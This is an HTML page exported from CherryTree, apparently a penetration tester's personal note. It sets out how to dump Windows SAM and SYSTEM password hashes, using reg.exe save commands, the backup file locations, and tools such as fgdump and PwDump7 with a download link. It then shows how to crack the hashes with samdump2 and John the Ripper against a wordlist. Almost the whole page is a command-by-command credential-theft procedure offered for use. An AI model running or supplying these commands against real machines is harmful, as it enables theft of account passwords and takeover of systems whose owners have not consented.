<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SAM and SYSTEM</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Dumping &amp; Cracking - SAM and SYSTEM</h1></strong><br />The SAM file contains password hashes.<br />To decrypt the SAM file, you need the SYSKEY from:<br /><code>C:\Windows\system32\config\SYSTEM</code> or <code>HKLM\SYSTEM</code><br />The Windows kernel keeps a lock on the SAM database, which means that it can&#39;t be accessed whilst the system is running.<br /><br /><strong><h2>## Dumping</h2></strong><br /><strong><h3>### Option #1 - Grab original SAM and SYSTEM files </h3></strong><br />Try grab the usual files (if you&#39;re lucky):<br /><code>C:\Windows\system32\config\SAM</code><br /><code>C:\Windows\system32\config\SYSTEM</code><br /><br />If can&#39;t access normally (99.9% of the time), use methods written in other node to grab protected files.<br /><br /><strong><h3>### Option #2 - Export from registry</h3></strong><br />Export the SAM and SYSTEM registrty hives from the registry.<br /><code>reg.exe save HKLM\SAM sam</code><br /><code>reg.exe save HKLM\SYSTEM system</code><br /><br /><strong><h3>### Option #3 - Grab backups</h3></strong><br />There might be backups of SAM and SYSTEM on the drive.<br /><code>C:\WINDOWS\repair\SAM</code><br /><code>C:\WINDOWS\repair\SYSTEM</code><br /><br /><strong><h3>### Option #4 - Use a tool</h3></strong><br />People have made a bunch of different tools over the years to dump creds from SAM.<br />Try them all if you&#39;re stuck. Some will work some of the time, others will work other times.<br /><br /><strong>fgdump</strong><br /><code>fgdump.exe</code><br /><br /><strong>PwDump</strong><br /><code>PwDump.exe -o outpwdump -x 127.0.0.1<br />type outpwdump</code><br /><br /><strong>PwDump7</strong><br /><a href="http://www.tarasco.org/security/pwdump_7">http://www.tarasco.org/security/pwdump_7</a><br /><code>pwdump7.exe</code><br />Can dump protected/in-use files. <br /><code>pwdump7.exe -d c:\lockedfile.dat backup-lockedfile.dat</code><br /><br /><strong><h2>## Crack</h2></strong><br /><code>samdump2 -o hashes.txt system sam</code><br /><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code></div>
</body>
</html>
